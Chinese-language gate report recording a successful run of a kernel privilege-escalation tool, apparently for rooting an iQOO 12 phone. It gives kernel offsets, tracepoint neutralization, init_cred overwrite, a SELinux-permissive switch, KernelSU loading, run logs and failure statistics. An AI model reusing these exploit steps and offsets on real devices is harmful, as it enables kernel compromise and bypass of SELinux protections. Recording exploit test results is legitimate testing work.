# ANC-01 真机门禁：vr.ko guard 与 multicast 重复投毒（multicast_waiter，direct）— PASS

对应提交 `a329df60`（`test(app): cover the new builtin in the legacy migration fixture`，即 PR
`vr-guard-pr` 的代码 tip；其后的 `docs:` 提交不影响二进制）。候选二进制 `build/native/ghostlock`
SHA-256 `7d85c26b0ffe93b257f4e0a751f51201b1a0226557c7c40a229ff7a3b98c7abb`
（md5 `02f2be01155bcb3603c77d00a58ded1c`）。设备端 profile md5 `3dea70aa29a9abc2878f32c96e9b68eb`
= 内置 `6.1.145-android14-11-maybe-dirty` 的导出文档，仅把 `execution.recommended_cpus` 改为配方
实测的 4/5（与导出文件仅 2 字节不同，已逐字节核对）。

## 设备与入口

- 型号 V2307A / PD2307（iQOO 12，12GB）；`uname -r` = `6.1.145-android14-11-maybe-dirty`；
  `ro.build.version.incremental` = `compiler260820121504`。
- 入口：CLI，`GHOSTLOCK_HOME=/data/local/tmp ./ghostlock-pr --load-prebuilt-profile pr-profile.bin`；
  route = multicast_waiter（来自 profile）；CPU 对 4/5（来自 profile）；KernelSU 未加载的冷启动、
  锁屏未解锁；运行起步 `boot_ms=78753`（≈79s 的低噪声窗口，见「尝试统计」）。
- 环境注记：
  - 本机 `pm list packages` 无任何 KernelSU 管理器；handoff 的 ksud 取自参考套件
    `files/ksud`（`ksud 3.3.0 (uapi: 2)`，含 android14-6.1 模块）推送至 `/data/local/tmp/ksud`
    —— 与套件 README 的手动步骤同路径。
  - 本机在开机时会清空 `/data/local/tmp`，因此文件每次 boot 后重新推送。
  - `.ghostlock_iomem` 为本机 12GB 的实测存档（`ghostlock-analysis/share/ghostlock_iomem`，
    release 戳一致；12 个 System RAM bank，span 42 GiB → `direct_map_end=ffffff8a7ffff000`，
    被 native 采纳）。

## 结果

PASS。完整运行（`fast_run2.stdout.log`）的关键行：

```
[*] cpu pair: main=4 consumer=5
[+] startup context pid=12850 uid=2000 ... attr=u:r:shell:s0 enforce=1  (boot_ms=78753)
[*] === W1: SELinux === target=0xffffff802a558f40 mode=1 leaf=0
[*] multicast route status=0 clean=1/1 step=0 errno=0 attempts=16 calls=1 success=1
[+] SELinux permissive
[*] [T+11100ms] Write 1 complete
[*] vr guard: neutralizing __tracepoint_sys_exit.funcs image=ffffffc0823cb1c0 target=ffffff802a3cb1c0 width=8
[+] vr guard: sys_exit probe disabled (attempt 1)
[*] W2b: firing prebuilt init_cred+8 repair
[*] child uid = 0
[+] child is root!
[+] no app seccomp filter (adb/shell flow); skipping W3
[*] [T+32375ms] exploit complete
[*] handoff: child=26080 alive=1 sent=1 errno=0
[*] handoff: root shell worker pid=10055
[*] enforce=1 (enforcing)
[+] KernelSU ready
```

设备侧根脚本日志（`/data/local/tmp/.ghostlock_ksu.log`）：

```
[*] root script start uid=0 euid=0
[*] iomem cache: cached 13455 bytes
[*] policy fixup rc=0
[*] late-load kmi=android14-6.1
[*] late-load exit=0
[*] temp su uid=0; watching kernelsu.ko
[+] KernelSU module loaded
```

事后核对（设备未重启、未 panic）：

- `su -c id` → `uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0`（连续 3 次 `id -u` = 0）。
- `su -c 'grep -i kernelsu /proc/modules'` → `kernelsu 217088 0 - Live 0x0000000000000000 (O)`。
- `loadavg` 0.57 / 2.53 / 1.69；SELinux 回到 Enforcing（`enforce=1`）。

## 尝试统计

共 9 次完整运行，1 次通过：

| 窗口 | 次数 | 结果 |
|---|---|---|
| uptime ≥ 240s、load < 10（配方默认窗口） | 6（4 次无 iomem 缓存、2 次有） | 6/6 在 route 阶段 panic 重启（multicast 单次未命中；stdout 缓冲截断，pstore 对 shell 不可读） |
| 开机后 ≈60–90s、锁屏未解锁（参考套件 README 的低噪声窗口） | 3 | 第 1 次在 W1b（scratch 修复）阶段 panic；第 2 次 **PASS**；第 3 次被成功判定终止，未计入 |

- 失败均为已记录的 `KERNEL-PANIC-01` 类（同构建可 PASS/panic，环境/时序），不归因代码。
- 观察：本机在该内核线的低噪声窗口明显优于 240s+ 窗口；单次成功率与套件文档的 25–30% 量级一致。

## 日志

- 本地留存：`gate-logs/fast_run2.stdout.log`（成功全程）、`fast_run1.stdout.log`（W1b 失败）、
  `cache_run1..2 / run1 / run_loop1..3.stdout.log`（240s 窗口的失败尝试）。
- 设备侧：`/data/local/tmp/.ghostlock_ksu.log`（上引）、`/data/local/tmp/.ghostlock_root.sh`。
- `--dump-kernel-log` 证据包（已拉取至 `gate-logs/glk-debug/`）：`kernel-info.txt`
  （uname//proc/version//proc/cmdline/selinux=Enforcing）、`kernel-dmesg.log`（shell 无 dmesg 权限）、
  `pstore/`（空）、`iomem.txt`、`ksu.log`。

## 变更说明

- 本记录验证的是 PR `vr-guard-pr` 的三项行为在最终二进制上的真机结果：
  1. `VrGuardPolicy`（`PreSpawn` 清 `__tracepoint_sys_exit.funcs`，目标 =
     `KIMAGE_TEXT_BASE + 0x23cb180 + 0x40`，与 BTF 推导的布局一致）；
  2. multicast 重复投毒/重复 walk（每次写验证 `status=0 … attempts=16 calls=1 success=1`）；
  3. 内置 `6.1.145-android14-11-maybe-dirty` profile（偏移、cred、geometry、调参）端到端可用。
- 与上一次门禁（2026-09-30，旧二进制、管理器在场）的差异：本次最终二进制 + 无管理器环境
  （ksud 走套件路径）；结论一致：`vr guard: sys_exit probe disabled` → `child is root!` →
  `KernelSU ready`，设备稳定。
